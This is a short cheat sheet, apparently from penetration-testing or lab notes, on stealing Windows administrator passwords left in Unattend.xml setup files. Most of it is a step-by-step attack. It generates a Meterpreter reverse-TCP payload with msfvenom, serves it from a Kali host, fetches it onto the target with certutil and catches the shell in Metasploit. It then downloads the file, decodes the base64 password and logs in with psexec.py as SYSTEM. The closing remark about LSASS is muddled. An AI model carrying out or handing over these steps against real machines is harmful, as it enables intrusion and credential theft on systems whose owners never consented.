**Searching Passwords in Windows Config Files —> Unattend.xml**

**What & Why**

- Unattended Windows Setup Utility used for mass Windows deployment
- Config files contain admin credentials → often left behind by admins
- Even unprivileged access is enough to read these files

**File Locations to Check**

```
C:\Windows\Panther\unattend.xml
C:\Windows\Panther\Unattend\unattend.xml
C:\Windows\Panther\Autounattend.xml
```

---

**Attack Flow**

**1. Generate Meterpreter payload (Kali)**

```prompt:kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=1234 -f exe -o payload.exe
```

**2. Host it**

```prompt:kali
python3 -m http.server 80
```

**3. Download on target (Windows CMD)**

```cmd
certutil -urlcache -f http://<kali-ip>/payload.exe payload.exe
```

**4. Set up handler (Kali)**

```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <kali-ip>
set LPORT 1234
run
```

**5. Find & download the file (Meterpreter)**

```bash
cd C:\\Windows\\Panther
dir
download unattend.xml
```

**6. Decode base64 password (Kali)**

```bash
echo "<base64string>" > password.txt
base64 -d password.txt
```

**7. Authenticate via PsExec**

```bash
psexec.py administrator@<target-ip>
# enter decoded password when prompted
whoami  # should return: nt authority\system
```

---

**Key Notes**

- Password in file may be base64 encoded (`plainText = false` = it's encoded)
- Admin might've changed password post-install — try anyway
- No admin privs needed to _read_ the file, only to exploit LSASS
